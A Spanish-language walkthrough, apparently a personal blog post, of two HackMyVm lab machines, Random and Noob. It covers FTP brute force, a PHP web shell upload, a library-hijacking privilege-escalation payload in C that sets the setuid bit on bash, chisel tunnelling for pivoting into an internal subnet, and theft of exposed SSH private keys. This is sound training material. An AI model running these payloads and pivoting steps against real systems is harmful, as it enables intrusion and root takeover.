---
title: HackMyVm - Random & Noob (Pivoting)
published: true
---

---

> Laboratorios de la página [HackMyVm](https://hackmyvm.eu/) 

## **_Random_**

### Enumeración

Con **netdiscover** escaneo la red para identificar dispositivos activos y saber la **IP** de la máquina dentro del rango de la interfaz eth0.

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

![](https://eidd3.github.io/assets/img/randomnoob/netdiscover.png)

Con **nmap** escaneo los puertos para saber qué servicios tiene la máquina.

![](https://eidd3.github.io/assets/img/randomnoob/nmao.png)

![](https://eidd3.github.io/assets/img/randomnoob/nmapscan.png)

* Puerto 80 - HTTP
* Puerto 22 - SSH
* Puerto 21 - FTP

Para un escaneo rápido de la web, lanzo el script _http-enum_ de **nmap** para descubrir algunas rutas o archivos.

![](https://eidd3.github.io/assets/img/randomnoob/httpenum.png)

Pero no muestra ningún resultado.

Trato de conectarme por **FTP** con el usuario _anonymous_ y sin contraseña, y me deja pero no puedo ingresar al directorio **html**.

![](https://eidd3.github.io/assets/img/randomnoob/ftp.png)

Y si intento descargar el contenido, creo que tampoco tengo los permisos para hacerlo.

![](https://eidd3.github.io/assets/img/randomnoob/ftpdown.png)

La página web muestra un mensaje y 2 nombres de usuarios.

![](https://eidd3.github.io/assets/img/randomnoob/web80.png)

Con **Hydra** intento fuerza bruta sobre el usuario **eleanor** para saber la contraseña.

![](https://eidd3.github.io/assets/img/randomnoob/ftppass.png)

Y la encuentra `eleanor:ladybug`

Si ahora intento descargar el contenido del directorio **html**, sí me deja.

![](https://eidd3.github.io/assets/img/randomnoob/ftpdownloaded.png)

Y parece que la página web está conectada con el servicio **FTP**.

Hago la prueba de tratar de subir un archivo.

![](https://eidd3.github.io/assets/img/randomnoob/putfile.png)

Pero no me deja.

Desde acá probé fuerza bruta por **SSH** al usuario **alan**, enumerar la web buscando directorios y archivos **.txt**,**.php**,**.html** pero no encontré nada.

Con la herramienta **sftp** intenté subir un archivo y sí me dejó.

![](https://eidd3.github.io/assets/img/randomnoob/sftp.png)

![](https://eidd3.github.io/assets/img/randomnoob/testtxt.png)

> stfp es un programa de transferencia de archivos similar a ftp, el cual realiza todas las opreaciones a través de un transporte ssh cifrado.

Se ve que **FTP** tiene restringidos los permisos de escritura o alguna configuración similar.

Ahora creé el típico on-liner en **PHP** para usar una web shell en la página y lo subi.

![](https://eidd3.github.io/assets/img/randomnoob/webshell.png)

![](https://eidd3.github.io/assets/img/randomnoob/wwwdata.png)

Teniendo ejecución de comandos, entablo una reverse shell.

![](https://eidd3.github.io/assets/img/randomnoob/revsh.gif)

#### www-data

El usuario **eleanor** no tenía acceso por **SSH** desde afuera, pero si pruebo desde la máquina usando la contraseña `ladybug`, si me deja.

### Root

Para elevar mis privilegios a root enumero los archivos que puedo ejecutar con los permisos del propietario.

![](https://eidd3.github.io/assets/img/randomnoob/perm4000.png)

Y el usuario **root** tiene un archivo ejecutable en el directorio de **alan**.
Si veo el resto de los archivos, hay una **note.txt** que no puedo leer, un archivo de texto **root.h** que contiene: 

```
eleanor@random:/home/alan$ cat root.h 
void makemeroot();
```

Y el archivo compilado **rooter.o** que al leerlo muestra:

```
eleanor@random:/home/alan$ cat rooter.o 
ELF>@@
NHH=]SUCCESS!! But I need to finish and implement this functionGCC: (Debian 8.3.0-6) 8.3.0zRAC

+rooter.cmakemeroot_GLOBAL_OFFSET_TABLE_puts

                                             .symtab.strtab.shstrtab.rela.text.data.bss.rodata.comment.note.GNU-stack.rela.eh_frame @@80
&SS1X90BWR@h
 
 	0aeleanor@random:/home/alan$ file rooter.o 
rooter.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
```
Parece que la función `makemeroot` no está implementada.

Si miro el archivo con _file_, veo que es un binario ejecutable de 64 bits, que al ejecutarlo se hace bajo el contexto de los privilegios del propietario y el grupo (root), ya que tiene **setuid** y **setgid** activos y que está vinculado a librerías compartidas.

![](https://eidd3.github.io/assets/img/randomnoob/filerandom.png)

#### Library Hijacking (?)

Esto último lo hace vulnerable a **Library Hijacking**, ya que si se puede modificar desde qué ruta carga las librerías, se puede crear un código malicioso para que, cuando se ejecute el programa como root, le cambie los permisos a la **bash** por ejemplo.

Si miro las librerías compartidas con **ldd**, veo que hace uso de _librooter.so_ y lo carga desde _/lib/librooter.so_ 

![](https://eidd3.github.io/assets/img/randomnoob/lddrandom.png)

Para cambiar el orden de carga, tengo que ver si tengo permisos de escritura en **/etc/ld.so.conf.d** que es el directorio que contiene los archivos de configuración para establecer la ruta de carga de las librerías.

Pero no puedo escribir en ese directorio.

Pero si miro en **/lib**, que es de donde el binario **random** carga la librería, sí puedo escribir.

Entonces lo que tengo que hacer es crear un archivo en **C** que implemente la función **makemeroot()**. Así, cuando lo compile, se llamará **librooter.so**, que es la biblioteca que carga el binario **random**. De esta manera, podré obtener permisos setuid y ejecutar un shell como root.

_exploit.c_:
```C
#include <unistd.h>
#include <stdlib.h>

void makemeroot()
{
        setuid(0);
        setgid(0);
        system("chmod u+s /bin/bash");
}
```

```bash
/usr/bin/gcc -shared exploit.c -o librooter.so
```

![](https://eidd3.github.io/assets/img/randomnoob/gcccompiled.gif)

![](https://eidd3.github.io/assets/img/randomnoob/bash-p.gif)

>Para que se aplique el cambio a la bash tenia que ejecutar el binario con un numero hasta que se iguale al random, pero justo fue el 1 y no mostro el error de "Wrong number" xd 

### Pivoting

Si veo todas las ip asociadas al host veo una interfaz en la subred 10.10.0.0/24.

![](https://eidd3.github.io/assets/img/randomnoob/hostname-i.png)

Para enumerar hosts dentro de esa subred puedo crear un script de bash.

```bash
for host in $(seq 0 254); do timeout 1 bash -c "ping -c 1 10.10.0.$host" &> /dev/null && echo -e "10.10.0.$host UP" & done; wait
```

```
bash-5.0# ./hosts.sh 
10.10.0.129 UP
10.10.0.130 UP
bash-5.0# 
```

Y el host con **IP 10.10.0.130** está activo.

Ahora para ver puertos abiertos, como la máquina no tiene **nmap**, hago un one-liner de bash enumerar puertos abiertos.

![](https://eidd3.github.io/assets/img/randomnoob/noob/openports.png)

* Puerto 22 
* Puerto 65530 

Para poder hacer un escaneo de esos puertos para ver información detallada uso [chisel](https://github.com/jpillora/chisel) para hacer **port forwarding**.

#### Chisel

> Chisel es una herramienta popular para realizar port forwarding y tunelización en redes, especialmente útil cuando se trabaja en entornos restringidos o de acceso limitado. Es una aplicación que permite tanto redirigir puertos locales a un servidor remoto como crear túneles reversos para acceder a recursos internos de una red remota

Para eso, primero paso la herramienta **chisel** a la máquina **Random**.

![](https://eidd3.github.io/assets/img/randomnoob/gif.gif)

### Remote port forwarding

Una opción es hacer remote port forwarding para ir viendo puerto por puerto con los siguientes parámetros.

_Máquina Kali_:

```ruby
❯ ./chisel server --reverse -p 1234
2024/10/16 14:35:20 server: Reverse tunnelling enabled
2024/10/16 14:35:20 server: Listening on http://0.0.0.0:1234
```

_Máquina Random_:

```ruby
root@random:~# ./chisel client 192.168.1.34:1234 R:22:10.10.0.130:22
2024/10/16 14:37:14 client: Connecting to ws://192.168.1.34:1234
2024/10/16 14:37:14 client: Connected (Latency 1.924012ms)
```

Con esto estaria haciendo que mi puerto **22** (**192.168.1.34**) se convierta en el puerto **22** de la máquina **Noob** (**10.10.0.130**) a través de la máquina **Random** que actúa como un intermediario.

![](https://eidd3.github.io/assets/img/randomnoob/noob/chisel22.png)

Y lo mismo con el **65530**

![](https://eidd3.github.io/assets/img/randomnoob/noob/chisel65530.png)

Pero hacer la conexión puerto por puerto, en caso de que sean varios puede ser tedioso.

### Socks

Otra forma de acceder a todo el tráfico es con **socks**, que permite tunelizar la conexión por un proxy local y redirigier el tráfico de la red interna de **Noob** a mi máquina.

_Máquina Kali_:

```ruby
❯ ./chisel server --reverse -p 1234
2024/10/16 15:57:35 server: Reverse tunnelling enabled
2024/10/16 15:57:35 server: Fingerprint t6Q2aEw5KvIprx+PfHQI8/n2GgtsLSU3tIvczuYhsX0=
2024/10/16 15:57:35 server: Listening on http://0.0.0.0:1234
2024/10/16 15:57:37 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
_Máquina Random_:

```ruby
root@random:~# ./chisel client 192.168.1.34:1234 R:socks
2024/10/16 15:56:05 client: Connecting to ws://192.168.1.34:1234
2024/10/16 15:56:05 client: Connected (Latency 1.611766ms)
```

Ahora que tengo conectividad a través del túnel creado, para poder interactuar con los puertos de la máquina **Noob**, tengo que configurar las herramientas para poder hacerlo como **proxychains** para poder usar **nmap** y **foxy proxy** para poder acceder desde navegador.

![](https://eidd3.github.io/assets/img/randomnoob/noob/foxyproxy.png)

![](https://eidd3.github.io/assets/img/randomnoob/noob/chiselallports.png)

## **_Noob_**

Con un escaneo a la web, existe un archivo _index_ y un directorio _nt4share_.

![](https://eidd3.github.io/assets/img/randomnoob/noob/netshare.png)

Parece que es el directorio personal del usuario **nt4share**, y lo interesante es el directorio **.ssh**.

Si ingreso están las claves `authorized_keys`, `id_rsa` y `id_rsa.pub`.

Al verlas, se ve que el usuario **adela** existe en el sistema.

Me descargo `id_rsa` que es la clave privada y accedo por **SSH**.

![](https://eidd3.github.io/assets/img/randomnoob/noob/adelassh.png)

### Root

Para elevar privilegios hay que crear un enlace simbólico que apunte al directorio /root y que va a poder ser accesible de la misma manera que el anterior, por la web.

![](https://eidd3.github.io/assets/img/randomnoob/noob/enlacesimbolico.png)

![](https://eidd3.github.io/assets/img/randomnoob/noob/rootweb.png)

Y ahora, el mismo metodo anterior: descargar la id_rsa de root y acceder por **SSH**.

![](https://eidd3.github.io/assets/img/randomnoob/noob/rootuser.png)

